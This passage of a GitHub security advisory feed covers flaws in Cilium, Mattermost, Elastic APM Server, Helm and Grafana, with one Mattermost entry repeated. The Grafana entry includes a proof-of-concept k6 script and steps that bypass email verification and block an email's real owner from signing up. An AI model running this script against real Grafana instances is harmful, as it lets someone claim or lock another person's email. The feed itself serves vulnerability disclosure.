<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @giorio94 and @gandro for their work on triaging and remediating this issue.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-x989-52fc-4vr4">https://github.com/cilium/cilium/security/advisories/GHSA-x989-52fc-4vr4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25631">https://nvd.nist.gov/vuln/detail/CVE-2024-25631</a></li>
<li><a href="https://docs.cilium.io/en/stable/installation/k8s-install-external-etcd/#when-do-i-need-to-use-a-kvstore">https://docs.cilium.io/en/stable/installation/k8s-install-external-etcd/#when-do-i-need-to-use-a-kvstore</a></li>
<li><a href="https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg">https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.14.7">https://github.com/cilium/cilium/releases/tag/v1.14.7</a></li>
<li><a href="https://github.com/advisories/GHSA-x989-52fc-4vr4">https://github.com/advisories/GHSA-x989-52fc-4vr4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x989-52fc-4vr4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-20T23:45:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Unencrypted ingress/health traffic when using Wireguard transparent encryption]]></title>
        <id>https://github.com/advisories/GHSA-7496-fgv9-xw82</id>
        <link href="https://github.com/advisories/GHSA-7496-fgv9-xw82"/>
        <updated>2024-02-20T23:44:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>For Cilium users who are using CRDs to store Cilium state (the default configuration) and <a href="https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg">Wireguard transparent encryption</a>, responses from pods to the Ingress and health endpoints are not encrypted. Traffic from the Ingress and health endpoints to pods is not affected by this issue. The health endpoint is only used for Cilium's internal health checks.</p>
<h3 id="patches">Patches</h3>
<p>This issue affects Cilium v1.14 before v1.14.7.</p>
<p>This issue has been patched in Cilium v1.14.7.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround to this issue - affected users are encouraged to upgrade.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @gandro for their work on triaging and remediating this issue.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-7496-fgv9-xw82">https://github.com/cilium/cilium/security/advisories/GHSA-7496-fgv9-xw82</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25630">https://nvd.nist.gov/vuln/detail/CVE-2024-25630</a></li>
<li><a href="https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg">https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.14.7">https://github.com/cilium/cilium/releases/tag/v1.14.7</a></li>
<li><a href="https://github.com/advisories/GHSA-7496-fgv9-xw82">https://github.com/advisories/GHSA-7496-fgv9-xw82</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7496-fgv9-xw82</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-20T23:44:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost fails to check the required permissions]]></title>
        <id>https://github.com/advisories/GHSA-r833-w756-h5p2</id>
        <link href="https://github.com/advisories/GHSA-r833-w756-h5p2"/>
        <updated>2024-02-19T05:07:34.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost fails to check the required permissions in the&nbsp;POST /api/v4/channels/stats/member_count API resulting in&nbsp;channel member counts being leaked to a user without permissions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24776">https://nvd.nist.gov/vuln/detail/CVE-2024-24776</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-r833-w756-h5p2">https://github.com/advisories/GHSA-r833-w756-h5p2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r833-w756-h5p2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-02-09T15:31:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost fails to check the required permissions]]></title>
        <id>https://github.com/advisories/GHSA-r833-w756-h5p2</id>
        <link href="https://github.com/advisories/GHSA-r833-w756-h5p2"/>
        <updated>2024-02-19T05:07:34.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost fails to check the required permissions in the&nbsp;POST /api/v4/channels/stats/member_count API resulting in&nbsp;channel member counts being leaked to a user without permissions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24776">https://nvd.nist.gov/vuln/detail/CVE-2024-24776</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-r833-w756-h5p2">https://github.com/advisories/GHSA-r833-w756-h5p2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r833-w756-h5p2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-02-09T15:31:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/elastic/apm-server] APM Server vulnerable to Insertion of Sensitive Information into Log File]]></title>
        <id>https://github.com/advisories/GHSA-8r33-q5j5-rh7g</id>
        <link href="https://github.com/advisories/GHSA-8r33-q5j5-rh7g"/>
        <updated>2024-02-16T23:18:07.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered whereby APM Server could log at ERROR level, a response from Elasticsearch indicating that indexing the document failed and that response would contain parts of the original document. Depending on the nature of the document that the APM Server attempted to ingest, this could lead to the insertion of sensitive or private information in the APM Server logs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23448">https://nvd.nist.gov/vuln/detail/CVE-2024-23448</a></li>
<li><a href="https://discuss.elastic.co/t/apm-server-8-12-1-security-update-esa-2024-03/352688">https://discuss.elastic.co/t/apm-server-8-12-1-security-update-esa-2024-03/352688</a></li>
<li><a href="https://www.elastic.co/community/security">https://www.elastic.co/community/security</a></li>
<li><a href="https://github.com/advisories/GHSA-8r33-q5j5-rh7g">https://github.com/advisories/GHSA-8r33-q5j5-rh7g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8r33-q5j5-rh7g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-08T00:32:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[helm.sh/helm/v3] Helm dependency management path traversal]]></title>
        <id>https://github.com/advisories/GHSA-v53g-5gjp-272r</id>
        <link href="https://github.com/advisories/GHSA-v53g-5gjp-272r"/>
        <updated>2024-02-15T15:34:42.000Z</updated>
        <content type="html"><![CDATA[<p>A Helm contributor discovered a path traversal vulnerability when Helm saves a chart including at download time.</p>
<h3 id="impact">Impact</h3>
<p>When either the Helm client or SDK is used to save a chart whose name within the <code>Chart.yaml</code> file includes a relative path change, the chart would be saved outside its expected directory based on the changes in the relative path. The validation and linting did not detect the path changes in the name.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been resolved in Helm v3.14.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Check all charts used by Helm for path changes in their name as found in the <code>Chart.yaml</code> file. This includes dependencies.</p>
<h3 id="credits">Credits</h3>
<p>Disclosed by Dominykas Blyžė at Nearform Ltd.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/helm/helm/security/advisories/GHSA-v53g-5gjp-272r">https://github.com/helm/helm/security/advisories/GHSA-v53g-5gjp-272r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25620">https://nvd.nist.gov/vuln/detail/CVE-2024-25620</a></li>
<li><a href="https://github.com/helm/helm/commit/0d0f91d1ce277b2c8766cdc4c7aa04dbafbf2503">https://github.com/helm/helm/commit/0d0f91d1ce277b2c8766cdc4c7aa04dbafbf2503</a></li>
<li><a href="https://github.com/helm/helm/releases/tag/v3.14.1">https://github.com/helm/helm/releases/tag/v3.14.1</a></li>
<li><a href="https://github.com/advisories/GHSA-v53g-5gjp-272r">https://github.com/advisories/GHSA-v53g-5gjp-272r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v53g-5gjp-272r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-15T15:34:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Email Validation Bypass And Preventing Sign Up From Email's Owner]]></title>
        <id>https://github.com/advisories/GHSA-3hv4-r2fm-h27f</id>
        <link href="https://github.com/advisories/GHSA-3hv4-r2fm-h27f"/>
        <updated>2024-02-13T22:25:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Email validation can easily be bypassed because <code>verify_email_enabled</code> option enable email validation at sign up only.
A user changing it's email after signing up (and verifying it) can change it without verification in <code>/profile</code>.
This can be used to prevent legitimate owner of the email address from signing up.</p>
<p>Another way to prevent email's owner from signing up is by setting Username as an email:
When a new user is registrering, they can set two different email addresses in the Email and Username field, technically having 2 email addresses (because Grafana handles usernames and emails the same in some situations), but only the former is validated.</p>
<p><img alt="" src="https://user-images.githubusercontent.com/44581623/282073913-c1a8c20b-b6c3-46eb-840c-9e0dae718a2a.png"></p>
<p>Here user a prevents owner of <a href="mailto:bar@example.com">bar@example.com</a> to signup.</p>
<h3 id="details">Details</h3>
<p>I don't know exact location but this is related to PUT /api/user handler.</p>
<h3 id="poc">PoC</h3>
<p>Bypass email validation:</p>
<ul>
<li>Start a new grafana instance using latest version</li>
<li>Sign up with email foo@example.</li>
<li>Login to that account.</li>
<li>Go to profile and change email to  <a href="mailto:bar@example.com">bar@example.com</a></li>
<li>That's it, your using an email you don't own.</li>
</ul>
<p>Prevent email's owner from signing up:</p>
<ul>
<li>Start a new grafana instance using latest version</li>
<li>Sign up with email foo@example.</li>
<li>Login to that account.</li>
<li>Go to profile and change username (not email) to <a href="mailto:bar@example.com">bar@example.com</a></li>
<li>Signout.</li>
<li>Try to sign up with email <a href="mailto:b@example.com">b@example.com</a></li>
<li>Warning popup "User with same email address already exists"</li>
</ul>
<p>K6 script (with <code>verify_email_enabled</code> set to <code>false</code>):</p>
<pre><code class="language-js">import { check, group } from "k6"
import http from "k6/http"

export const options = {
  scenarios: {
    perVuIter: {
      executor: 'per-vu-iterations',
      vus: 1,
      iterations: 1
    }
  }
}

const GRAFANA_URL = __ENV.GRAFANA_URL || "http://localhost:3000"

export default function () {
  group("create user_a with email foo@example.com", () =&gt; {
    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({
      "email": "foo@example.com",
      "password": "password"
    }), {
      headers: {
        'Content-Type': "application/json"
      }
    })

    check(response, {
      'status code is 200': (r) =&gt; r.status == 200
    })
  })

  group("change user_a login to bar@example.com", () =&gt; {
    const response = http.put(`${GRAFANA_URL}/api/user`, JSON.stringify({
      "email": "foo@example.com",
      "login": "bar@example.com", // user_b email.
    }), {
      headers: {
        'Content-Type': "application/json"
      }
    })

    check(response, {
      'status code is 200': (r) =&gt; r.status == 200
    })
  })

  http.cookieJar().clear(GRAFANA_URL)

  group("create user_b with email bar@example.com", () =&gt; {
    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({
      "email": "bar@example.com",
      "username": "bar@example.com",
      "password": "password"
    }), {
      headers: {
        'Content-Type': "application/json"
      }
    })

    check(response, {
      'status code is 200': (r) =&gt; r.status == 200 // fail
    })
  })
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Bypass email verification.
Prevent legitimate owner from signing up.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grafana/bugbounty/security/advisories/GHSA-3hv4-r2fm-h27f">https://github.com/grafana/bugbounty/security/advisories/GHSA-3hv4-r2fm-h27f</a></li>
<li><a href="https://github.com/advisories/GHSA-3hv4-r2fm-h27f">https://github.com/advisories/GHSA-3hv4-r2fm-h27f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3hv4-r2fm-h27f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-13T22:25:10.000Z</published>
    </entry>
</feed>